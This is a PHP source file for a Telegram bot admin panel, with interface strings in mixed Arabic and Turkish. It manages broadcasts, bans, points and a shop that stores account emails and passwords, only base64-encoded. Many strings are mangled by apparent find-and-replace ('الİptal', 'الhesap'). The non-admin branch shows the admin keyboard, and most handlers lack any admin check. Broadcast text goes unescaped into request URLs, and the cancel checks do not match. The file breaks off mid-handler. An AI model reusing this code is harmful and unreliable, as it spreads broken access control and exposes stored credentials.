<?php
$members = explode("\n",file_get_contents("yhya/members.txt"));
$sting = file_get_contents("yhya/sting$from_id.txt");
$send = file_get_contents("yhya/send$from_id.txt");
$memberscount = count($members);
$photo = $update->message->photo;
$video = $update->message->video;
$data = $update->callback_query->data;
$sticker = $update->message->sticker;
$file = $update->message->document;
$music = $update->message->audio;
$voice = $update->message->voice;
$caption = $message->caption;
$photo_id = $update->message->photo[0]->file_id;
$video_id= $update->message->video->file_id;
$sticker_id = $update->message->sticker->file_id;
$file_id = $update->message->document->file_id;
$music_id = $update->message->audio->file_id;
$voice_id = $update->message->voice->file_id;

if($text == "/start" or $text == "/admin" or $text == "back 🔙" or $text == "İptal ❌"  or $text == 'geri 🔙'){
	if($from_id == $admin){
	$sales['all']['mail']['free'] += 0;
	$sales['all']['index']['free'] += 0;
	$sales['all']['mail']['plus'] += 0;
	$sales['all']['index']['plus'] += 0;
	add($sales);
	unlink("yhya/sting$from_id.txt");
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	🙋🏻‍♂️¦أهلا بك عزيزي الأدمن 🔱
	⚙️¦هذه إعداداتك الخاصة بك 🌚
", 
	     'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"abone sayısı 📊"],['text'=>"اذاعة 📢"]
],
[
['text'=>"hoş geldiniz metni 🙋🏻‍♂️"]
], 
[
['text'=>"özel yasak 🔊"],['text'=>"İptal özel yasak 🔈"]
],
[
['text'=>"puan ekle ➕"]
],
[
['text'=>"Kimliğe göre yasaklama Ⓜ 🔊"],['text'=>"İptal Kimliğe göre yasaklama Ⓜ 🔈"]
],
[
['text'=>"خصم نقاط ➖"]
],
[
['text'=>"اضف عرض ➕"],['text'=>"gösteriyi kaldır ➖"]
],
[
['text'=>"نقاط للكل 🎁"]
],
[
['text'=>"نقاط الدعوة 🔁"],['text'=>"günlük puan 📅"]
],
[
['text'=>"Transfer Komisyonu 🔁"]
],
[
['text'=>"أضف أدمن ➕"],["text"=>"أزل أدمن ➖"]
],
[
['text'=>"talimat modu 📝"]
],
[
['text'=>"Destek olmak 📁"],['text'=>"Ücretli Dizin ⚡"]
],
],
])

]);}else{
	$sales['all']['mail']['free'] += 0;
	$sales['all']['index']['free'] += 0;
	$sales['all']['mail']['plus'] += 0;
	$sales['all']['index']['plus'] += 0;
	add($sales);
	unlink("yhya/sting$from_id.txt");
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	🙋🏻‍♂️¦أهلا بك عزيزي الأدمن 🔱
	⚙️¦هذه إعداداتك الخاصة بك 🌚
", 
	     'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"abone sayısı 📊"],['text'=>"اذاعة 📢"]
],
[
['text'=>"hoş geldiniz metni 🙋🏻‍♂️"]
], 
[
['text'=>"özel yasak 🔊"],['text'=>"İptal özel yasak 🔈"]
],
[
['text'=>"puan ekle ➕"]
],
[
['text'=>"Kimliğe göre yasaklama Ⓜ 🔊"],['text'=>"İptal Kimliğe göre yasaklama Ⓜ 🔈"]
],
[
['text'=>"خصم نقاط ➖"]
],
[
['text'=>"اضف عرض ➕"],['text'=>"gösteriyi kaldır ➖"]
],
[
['text'=>"نقاط للكل 🎁"]
],
[
['text'=>"نقاط الدعوة 🔁"],['text'=>"günlük puan 📅"]
],
[
['text'=>"Transfer Komisyonu 🔁"]
],
[
['text'=>"talimat modu 📝"],['text'=>"Ücretli Dizin ⚡"]
],
],
])

]);
	}
}
if($text == "talimat modu 📝"){
	bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
📮¦ارسل الان اي نص لاضعه كتعليمات للبوت
",'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
]),'reply_to_message_id'=>$message_id,
]);
file_put_contents("yhya/sting$from_id.txt","help");
}
	if($text != "İptal ❌" and $sting == "help"){
		bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
✅¦تم حفظ التعليمات بنجاح
",'reply_to_message_id'=>$message_id, 
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
])
]);
file_put_contents("yhya/help.txt","$text");
unlink("yhya/sting$from_id.txt");
		}
if($from_id == $admin){
if($text == "أضف أدمن ➕"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🆔️¦أرسل الأن ايدي الشخص لرفعه ادمن
",'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
]),'reply_to_message_id'=>$message_id,]);
file_put_contents("yhya/sting$from_id.txt","addadmin");
}
if($text != "İptal ❌" and $sting == "addadmin"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
✅¦تم رفعه ادمن بنجاح 👍
",'reply_to_message_id'=>$message_id, 
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
])]);
file_put_contents("yhya/admins.txt",$text."\n",FILE_APPEND);
bot('sendmessage',[
'chat_id'=>$text,
'text'=>"
✅¦تم رفعك ادمن 😉
/start
"]);
unlink("yhya/sting$from_id.txt");
}
if($text == "أزل أدمن ➖"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🆔️¦أرسل الأن ايدي الشخص لتنزيله من الادارة
",'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
]),'reply_to_message_id'=>$message_id,]);
file_put_contents("yhya/sting$from_id.txt","deladmin");
}
if($text != "İptal ❌" and $sting == "deladmin"){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
✅¦تم تنزيله بنجاح 👌
",'reply_to_message_id'=>$message_id, 
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
])]);
$a = str_replace("$text","",file_get_contents("yhya/admins.txt"));
file_put_contents("yhya/admins.txt",$a);
bot('sendmessage',[
'chat_id'=>$text,
'text'=>"
✅¦تم تنزيلك من الادارة 😢
/start
"]);
unlink("yhya/sting$from_id.txt");
}
}
if($text == "Kimliğe göre yasaklama Ⓜ 🔊" ) {
	bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
🔊¦ارسل معرف الشخص 👤 الذي تريد حظره
",'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
])
]);
file_put_contents("yhya/sting$from_id.txt","bandu");
} 
if(preg_match('/^(@)(\S{5,32})/i',$text) and $sting == "bandu" and $text != "İptal ❌"){
$tf = str_replace("@","",$text);
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
🔊¦تم حظره  بنجاح ✔️
[$text](https://t.me/$tf) 
", 'reply_to_message_id'=>$message_id, 
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]),'disable_web_page_preview'=>'true',
  'parse_mode'=>"MarkDown",
]);
bot('sendMessage',[
	'chat_id'=>"$text", 
'text'=>"
تم حظرك بواسطة الادمن
	" 
]) ;
$tf = str_replace("@","",$text);
file_put_contents("yhya/band_user.txt",$tf."\n",FILE_APPEND);
unlink("yhya/sting$from_id.txt");
}
if($text =="İptal Kimliğe göre yasaklama Ⓜ 🔈" ) {
	bot('sendMessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	🔈¦ارسل ايدي الشخص الذي تريد İptal الحظر 🚶🏻‍♂️
	",'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
])
	]);
file_put_contents("yhya/sting$from_id.txt","unkband1");} 
if($text !="İptal ❌" and $sting == "unkband1" ) {
$tf = str_replace("@","",$text);
$a = str_replace("$tf","",file_get_contents("yhya/band_user.txt"));
        file_put_contents("yhya/band_user.txt",$a);
$tf = str_replace("@","",$text);
	bot('sendMessage',[
	'chat_id'=>$chat_id, 
	'text'=>"🔊¦تم İptal الخظر  بنجاح ✔️
[$text](https://t.me/$tf) 
",'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]),'disable_web_page_preview'=>'true',
  'parse_mode'=>"MarkDown",
]);
bot('sendMessage',[
	'chat_id'=>$text, 
	'text'=>"🎊¦مبارك تم İptal حظرك 📣", 
]);
unlink("yhya/sting$from_id.txt");
}
if($text == "abone sayısı 📊" ) {
	bot('sendMessage',[
	'chat_id' =>$chat_id, 
	'text'=>" 
📊¦عدد مشتركين البوت هو $memberscount
	", 'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) 
]);}
if($kkykkn == 'yes' or $text == "اذاعة 📢" ){
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🙋🏻‍♂¦أهلا بك عزيزي في قسم الاذاعة
🔘¦ إستخدم الأزرار للتحكم بنوع الاذاعة
",'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"Bir mesaj Paylaş 💌"],['text'=>"Resimli posta 🎑"]
],
[
['text'=>"Video yayınla 🎥"],['text'=>"Poster yayınla 🎐"]
],
[
['text'=>"dosya yayınla 📁"],['text'=>"نشر صوت 🎧"]
],
[
['text'=>"نشر ماركدون 🎐"],['text'=>"نشر HTML 📮"]
],
[
['text'=>"geri 🔙"],['text'=>"توجيه 🔁"]
],
],
'resize_keyboard'=>true])
]);
}
if($text == "İptal ❌" and $send != null){
	bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
❎¦تم الİptal بنجاح 💯
🔙¦سيتم الgeri للقائمة الرئيسة بعد 5 ثواني
",'reply_to_message_id'=>$message_id,
]);
sleep(4);
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🙋🏻‍♂¦أهلا بك عزيزي في قسم الاذاعة
🔘¦ إستخدم الأزرار للتحكم بنوع الاذاعة
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"Bir mesaj Paylaş 💌"],['text'=>"Resimli posta 🎑"]
],
[
['text'=>"Video yayınla 🎥"],['text'=>"Poster yayınla 🎐"]
],
[
['text'=>"dosya yayınla 📁"],['text'=>"نشر صوت 🎧"]
],
[
['text'=>"نشر ماركدون 🎐"],['text'=>"نشر HTML 📮"]
],
[
['text'=>"geri 🔙"]
],
],
'resize_keyboard'=>true])
]);
	}
if($text == "Bir mesaj Paylaş 💌"){
	file_put_contents('yhya/send'.$from_id.'.txt','txt');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
💬- الان ارسل اي شيء لارسله ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
],
],
'resize_keyboard'=>true])
]);
}
if($text == "Resimli posta 🎑"){
	file_put_contents('yhya/send'.$from_id.'.txt','photo');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🌌¦الان ارسل اي صورة لارسلها ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
],
],
'resize_keyboard'=>true])
]);
	}
	if($text == 'Video yayınla 🎥'){
		file_put_contents('yhya/send'.$from_id.'.txt','video');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🌌¦الان ارسل اي فيديو لارسلها ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
],
],
'resize_keyboard'=>true])
]);
	}
	if($text == "Poster yayınla 🎐"){
	file_put_contents('yhya/send'.$from_id.'.txt','sticker');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
💬¦ الان ارسل اي ملصق لارسله ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
],
],
'resize_keyboard'=>true])
]);
}
	if($text == "dosya yayınla 📁"){
	file_put_contents('yhya/send'.$from_id.'.txt','file');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
💬¦ الان ارسل اي ملف او صورة gif لارسله ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
],
],
'resize_keyboard'=>true])
]);
}
	if($text == "نشر صوت 🎧"){
		file_put_contents('yhya/send'.$from_id.'.txt','music');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
💬¦ الان ارسل اي ملف صوتي 🎧 لارسله ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
],
],
'resize_keyboard'=>true])
]);
}
	if($text == "نشر ماركدون 🎐"){
		file_put_contents('yhya/send'.$from_id.'.txt','Markdown');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
💬¦ الان ارسل اي نص 💌 وسيدعم الماركدون لارسله ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
],
],
'resize_keyboard'=>true])
]);
}
if($text == "نشر HTML 📮"){
		file_put_contents('yhya/send'.$from_id.'.txt','HTML');
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
💬¦ الان ارسل اي نص 💌 وسيدعم الHTML لارسله ل $memberscount
",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
],
],
'resize_keyboard'=>true])
]);
}
	
	
	
	/* اذاعة 📢 */
	if($text != "İptal ❌"){
if($text != 'İptal ❌' and $send == "txt"){
$urla = 'https://';
$urla .= $_SERVER['SERVER_NAME'];
$urla .= $_SERVER['SCRIPT_NAME'];
$urlb = explode("/",$urla);
$urlc = count($urlb);
$urld = $urlc - 1;
$urlq = $urlb[$urld];
$url = str_replace($urlq,"",$urla);
$caption = str_replace("\n","%0A",$caption);
$text = str_replace("\n","%0A",$text);
	file_get_contents($url."send.php?Type=text&Text=$text");
unlink('yhya/send'.$from_id.'.txt');
}
if($text != 'İptal ' and $send == 'photo' and $photo){
	$urla = 'https://';
$urla .= $_SERVER['SERVER_NAME'];
$urla .= $_SERVER['SCRIPT_NAME'];
$urlb = explode("/",$urla);
$urlc = count($urlb);
$urld = $urlc - 1;
$urlq = $urlb[$urld];
$url = str_replace($urlq,"",$urla);
$caption = str_replace("\n","%0A",$caption);
$text = str_replace("\n","%0A",$text);
	file_get_contents($url."send.php?Type=photo&Id=$photo_id&Caption=$caption");
unlink('yhya/send'.$from_id.'.txt');
}
if($text != 'İptal ' and $send == 'video' and $video){
	$urla = 'https://';
$urla .= $_SERVER['SERVER_NAME'];
$urla .= $_SERVER['SCRIPT_NAME'];
$urlb = explode("/",$urla);
$urlc = count($urlb);
$urld = $urlc - 1;
$urlq = $urlb[$urld];
$url = str_replace($urlq,"",$urla);
$caption = str_replace("\n","%0A",$caption);
$text = str_replace("\n","%0A",$text);
	file_get_contents($url."send.php?Type=video&Id=$video_id&Caption=$caption");
unlink('yhya/send'.$from_id.'.txt');
}
if($text != 'İptal ' and $send == 'sticker' and $sticker){
	$urla = 'https://';
$urla .= $_SERVER['SERVER_NAME'];
$urla .= $_SERVER['SCRIPT_NAME'];
$urlb = explode("/",$urla);
$urlc = count($urlb);
$urld = $urlc - 1;
$urlq = $urlb[$urld];
$url = str_replace($urlq,"",$urla);
$caption = str_replace("\n","%0A",$caption);
$text = str_replace("\n","%0A",$text);
	file_get_contents($url."send.php?Type=sticker&Id=$sticker_id&Caption=$caption");
unlink('yhya/send'.$from_id.'.txt');
}
if($text != 'İptal ' and $send == 'file' and $file){
	$urla = 'https://';
$urla .= $_SERVER['SERVER_NAME'];
$urla .= $_SERVER['SCRIPT_NAME'];
$urlb = explode("/",$urla);
$urlc = count($urlb);
$urld = $urlc - 1;
$urlq = $urlb[$urld];
$url = str_replace($urlq,"",$urla);
$caption = str_replace("\n","%0A",$caption);
$text = str_replace("\n","%0A",$text);
	file_get_contents($url."send.php?Type=file&Id=$file_id&Caption=$caption");
unlink('yhya/send'.$from_id.'.txt');
}
if($text != 'İptal ' and $send == 'music' and $music){
	$urla = 'https://';
$urla .= $_SERVER['SERVER_NAME'];
$urla .= $_SERVER['SCRIPT_NAME'];
$urlb = explode("/",$urla);
$urlc = count($urlb);
$urld = $urlc - 1;
$urlq = $urlb[$urld];
$url = str_replace($urlq,"",$urla);
$caption = str_replace("\n","%0A",$caption);
$text = str_replace("\n","%0A",$text);
	file_get_contents($url."send.php?Type=music&Id=$music_id&Caption=$caption");
unlink('yhya/send'.$from_id.'.txt');
}
if($text != 'İptal ' and $send == 'music' and $voice){
	$urla = 'https://';
$urla .= $_SERVER['SERVER_NAME'];
$urla .= $_SERVER['SCRIPT_NAME'];
$urlb = explode("/",$urla);
$urlc = count($urlb);
$urld = $urlc - 1;
$urlq = $urlb[$urld];
$url = str_replace($urlq,"",$urla);
$caption = str_replace("\n","%0A",$caption);
$text = str_replace("\n","%0A",$text);
	file_get_contents($url."send.php?Type=voice&Id=$voice_id&Caption=$caption");
unlink('yhya/send'.$from_id.'.txt');
}
if($text != 'İptal ' and $send == 'Markdown'){
	$urla = 'https://';
$urla .= $_SERVER['SERVER_NAME'];
$urla .= $_SERVER['SCRIPT_NAME'];
$urlb = explode("/",$urla);
$urlc = count($urlb);
$urld = $urlc - 1;
$urlq = $urlb[$urld];
$url = str_replace($urlq,"",$urla);
$caption = str_replace("\n","%0A",$caption);
$text = str_replace("\n","%0A",$text);
	file_get_contents($url."send.php?Type=Markdown&Text=$text");
unlink('yhya/send'.$from_id.'.txt');
}
if($text != 'İptal ' and $send == 'HTML'){
	$urla = 'https://';
$urla .= $_SERVER['SERVER_NAME'];
$urla .= $_SERVER['SCRIPT_NAME'];
$urlb = explode("/",$urla);
$urlc = count($urlb);
$urld = $urlc - 1;
$urlq = $urlb[$urld];
$url = str_replace($urlq,"",$urla);
$caption = str_replace("\n","%0A",$caption);
$text = str_replace("\n","%0A",$text);
	file_get_contents($url."send.php?Type=HTML&Text=$text");
unlink('yhya/send'.$from_id.'.txt');
}
}
if($text == "İptal ❌" and $from_id == $admin){
unlink("yhya/sting$from_id.txt");
unlink('yhya/send'.$from_id.'.txt');
}
if ($text =="hoş geldiniz metni 🙋🏻‍♂️" ) {
file_put_contents("yhya/sting$from_id.txt","start1");
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>'
🔰¦ أرسل hoş geldiniz metni 🙋🏻‍♂️
يمكنك وضع اسم المرسل بشرط ان تضعه بين {}
هكذا
{İsim}
وللنقاط
{نقاط}
','reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
])
]);
}
if($text != "İptal ❌" and $sting =="start1"  ){
file_put_contents("yhya/start.txt",$text); 
unlink("yhya/sting$from_id.txt");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
🙋🏻‍♂️¦تم حفط hoş geldiniz metni هو 
$text
/start
 ", 'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]) ]);}
if($text == "özel yasak 🔊" ) {
	bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
🔊¦ارسل ايدي الشخص 👤 الذي تريد حظره
" ,'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
])
]) ;
file_put_contents("yhya/sting$from_id.txt","band");
} 
if(preg_match('/^()(\S{5,32})/i',$text) and $sting == "band"  and $text != "İptal ❌"){
bot("sendMessage",[
"chat_id"=>$chat_id,
"text"=>"
🔊¦تم حظره  بنجاح ✔️
[$text](tg://user?id=$text) 
", 'reply_to_message_id'=>$message_id, 
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]),'disable_web_page_preview'=>'true',
  'parse_mode'=>"MarkDown",
]);
bot('sendMessage',[
	'chat_id'=>$text, 
'text'=>"
تم حظرك بواسطة الادمن
	" 
]) ;
file_put_contents("yhya/band_id.txt",$text."\n",FILE_APPEND);
unlink("yhya/sting$from_id.txt");
} 

if($text =="İptal özel yasak 🔈" ) {
	bot('sendMessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	🔈¦ارسل ايدي الشخص الذي تريد İptal الحظر 🚶🏻‍♂️
	",'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
])
	]) ;
file_put_contents("yhya/sting$from_id.txt","unkband");} 
if($text != "İptal ❌" and $sting == "unkband" ) {
	$a = str_replace("$text","",file_get_contents("yhya/band_id.txt"));
        file_put_contents("yhya/band_id.txt",$a);
	bot('sendMessage',[
	'chat_id'=>$chat_id, 
	'text'=>"🔊¦تم İptal الخظر  بنجاح ✔️
[$text](tg://user?id=$text) 
",'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
]),'disable_web_page_preview'=>'true',
  'parse_mode'=>"MarkDown",
]);
bot('sendMessage',[
	'chat_id'=>$text, 
	'text'=>"🎊¦مبارك تم İptal حظرك 📣", 
	
]);
unlink("yhya/sting$from_id.txt");
}
if($text == "puan ekle ➕"){
	bot('sendMessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	ارسل الان ايدي الشخص المراد ارسال له النقاط بسطر وعدد النقاط بسطر
	مثل
	809064751
	10
	",'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
])
]);
	file_put_contents("yhya/sting$from_id.txt","nkat");
	}
	$ex = explode("\n",$text);
	if($text != "İptal ❌" and $ex[0] and $ex[1] and $sting == "nkat"){
		bot('sendMessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم ارسال النقاط بنجاح
	"]);
	bot('sendMessage',[
	'chat_id'=>$ex[0], 
	'text'=>"
	لقد ربحت $ex[1] نقاط من الادارة
	"]);
	$coin[$ex[0]] += $ex[1];
	save($coin);
	unlink("yhya/sting$from_id.txt");
		}
		if($text == "خصم نقاط ➖"){
			bot('sendMessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	ارسل الان ايدي الشخص المراد ارسال له النقاط بسطر وعدد النقاط بسطر
	مثل
	809064751
	10
	",'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
], 
], 
'resize_keyboard'=>true
])]);
	file_put_contents("yhya/sting$from_id.txt","nkat0");
	}
	$ex = explode("\n",$text);
	if($text != "İptal ❌" and $ex[0] and $ex[1] and $sting == "nkat0"){
		bot('sendMessage',[
	'chat_id'=>$chat_id, 
	'text'=>"
	تم خصم النقاط بنجاح
	"]);
	bot('sendMessage',[
	'chat_id'=>$ex[0], 
	'text'=>"
	لقد خصم منك $ex[1] نقاط من الادارة
	"]);
	$coin[$ex[0]] -= $ex[1];
	save($coin);
	unlink("yhya/sting$from_id.txt");
		}
		if($text == "اضف عرض ➕"){
			bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	اهلا بك عزيزي الأدمن 👮
	الان ارسل نوع العرض 🍃
	",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"hesap 👤"],['text'=>"dizin 📁"]
],
],
'resize_keyboard'=>true
])
]);
			}
			
			if($text == "hesap 👤"){
				bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	اختر نوع الhesap الان 😻
	",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"مجاني 🆓"],['text'=>"مدفوع 🆕"]
],
[
['text'=>"İptal ❌"]
],
],
'resize_keyboard'=>true
])
]);
				}
				if($text == "مجاني 🆓"){
					bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان نوع الhesap 😍
	",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
],
],
'resize_keyboard'=>true
])
]);
$acount = $sales['all']['mail']['free'];
file_put_contents("yhya/sting$from_id.txt","addmailfree");

}
if($text != "İptal ❌"and $sting == "addmailfree"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان وصف الhesap 💌
	",'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode(['KeyboardRemove'=>[],'remove_keyboard'=>true])
]);
$acount = $sales['all']['mail']['free'];
$sales['mail']['free'][$acount]['ok'] = true;
$sales['mail']['free'][$acount]['name'] = $text;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addmailfreeaboud");
	}
				if($text and $sting == "addmailfreeaboud"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان سعر الhesap 💌
	",'reply_to_message_id'=>$message_id,
]);
$acount = $sales['all']['mail']['free'];
$a = str_replace("\n",'÷÷÷',$text);
$sales['mail']['free'][$acount]['aboud'] = $a;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addmailfreecoin");
	}
	if(is_numeric($text) and $sting == "addmailfreecoin"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان صورة الhesap 💌
	",'reply_to_message_id'=>$message_id,
]);
$acount = $sales['all']['mail']['free'];
$sales['mail']['free'][$acount]['coin'] = $text;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addmailfreephoto");
	}
	if($photo and $sting == "addmailfreephoto"){
		$acount = $sales['all']['mail']['free'];
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان ملاحظة عن الhesap 📮
	",'reply_to_message_id'=>$message_id,
]);
$sales['mail']['free'][$acount]['photo'] = $photo_id;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addmailfreeenots");
	}
	if($text and $sting == "addmailfreeenots"){
		$acount = $sales['all']['mail']['free'];
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان ايميل الhesap 💌
	",'reply_to_message_id'=>$message_id,
]);
$a = str_replace("\n","÷÷÷",$text);
$sales['mail']['free'][$acount]['nots'] = $a;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addmailfreeemail");
	}
	if($text and $sting == "addmailfreeemail"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان كلمة سر الhesap 💌
	",'reply_to_message_id'=>$message_id,
]);
$acount = $sales['all']['mail']['free'];
$aa = base64_encode($text);
$sales['mail']['free'][$acount]['email'] = $aa;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addmailfreepass");
	}
	if($text and $sting == "addmailfreepass"){
	$acount = $sales['all']['mail']['free'];
		$name2 = $sales['mail']['free'][$acount]['name'];
		$h = $sales['mail']['free'][$acount]['coin'];
		$a = str_replace('÷÷÷',"\n",$sales['mail']['free'][$acount]['aboud']);
		$n = str_replace('÷÷÷',"\n",$sales['mail']['free'][$acount]['nots']);
		$email = base64_decode($sales['mail']['free'][$acount]['email']);
		
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	تم الحفظ بنجاح ✅
	رقم الhesap : $acount
	نوع الhesap : $name2
	الوصف : $a
	السعر : $h
	الايميل : $email
	الباسورد : $text
	ملاحظة : $n
	",'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"back 🔙"]
], 
], 
'resize_keyboard'=>true
])
]);
$acount = $sales['all']['mail']['free'];
$aaa = base64_encode($text);
$sales['mail']['free'][$acount]['pasa'] = $aaa;
$sales['mail']['free'][$acount]['user'] = $username;
$sales['all']['mail']['free'] += 1;
add($sales);
unlink("yhya/sting$from_id.txt");
	}
	
					if($text == "مدفوع 🆕"){
						bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان نوع الhesap 😍
	",'reply_to_message_id'=>$message_id,
  'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"İptal ❌"]
],
],'resize_keyboard'=>true
])
]);
file_put_contents("yhya/sting$from_id.txt","addmailplus");
						}
						if($text != "İptal ❌"and $sting == "addmailplus"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان وصف الhesap 💌
	",'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode(['KeyboardRemove'=>[],'remove_keyboard'=>true])
]);
$acount = $sales['all']['mail']['plus'];
$sales['mail']['plus'][$acount]['ok'] = true;
$sales['mail']['plus'][$acount]['name'] = $text;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addmailplusaboud");
	}
				if($text and $sting == "addmailplusaboud"){
	bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان سعر الhesap 💌
	",'reply_to_message_id'=>$message_id,
]);
$acount = $sales['all']['mail']['plus'];
$a = str_replace("\n",'÷÷÷',$text);
$sales['mail']['plus'][$acount]['aboud'] = $a;
add($sales);
file_put_contents("yhya/sting$from_id.txt","addmailpluscoin");
	}
	if($text and $sting == "addmailpluscoin"){
		bot('sendmessage',[
	'chat_id'=>$chat_id, 
	'text' =>"
	ارسل الان صورة الhesap 🌌
	",'reply_to_message_id'=>$message_id,
]);
		$acount = $sales['all']['mail']['plus'];
